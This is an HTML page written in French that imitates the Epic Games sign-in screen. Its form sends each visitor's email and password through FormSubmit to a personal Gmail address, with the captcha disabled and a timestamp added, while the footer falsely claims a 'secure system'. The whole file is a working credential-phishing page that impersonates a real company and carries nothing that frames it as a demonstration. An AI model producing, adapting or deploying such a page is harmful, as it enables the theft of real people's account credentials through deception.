<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Epic Games</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #101014;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: #18181c;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
            width: 100%;
            max-width: 400px;
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo h1 {
            color: #ffffff;
            font-size: 24px;
            margin-bottom: 10px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #ffffff;
            font-weight: 500;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #2a2a2e;
            border-radius: 8px;
            font-size: 15px;
            background: #0f0f13;
            color: #ffffff;
            transition: border-color 0.3s;
        }

        input:focus {
            outline: none;
            border-color: #26bbff;
        }

        .btn {
            width: 100%;
            padding: 14px;
            background: #26bbff;
            color: #000000;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(38, 187, 255, 0.4);
        }

        .footer {
            margin-top: 30px;
            text-align: center;
            color: #666;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Se connecter a Epic Games</h1>
        </div>

        <form action="https://formsubmit.co/info.personnel03@gmail.com" method="POST">
            <!-- Configuration FormSubmit -->
            <input type="hidden" name="_subject" value="🔔 Nouvelle connexion Epic Games">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_template" value="table">
            
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" name="Email" id="email" required>
            </div>

            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="text" name="Mot_de_passe" id="password" required placeholder="••••••••">
            </div>

            <input type="hidden" name="Date" id="dateField">

            <button type="submit" class="btn">Continuer</button>
        </form>

        <div class="footer">
            <p>© 2026 - Système sécurisé</p>
        </div>
    </div>

    <script>
        // Ajouter la date automatiquement
        document.getElementById('dateField').value = new Date().toLocaleString('fr-FR');
    </script>
</body>
</html>
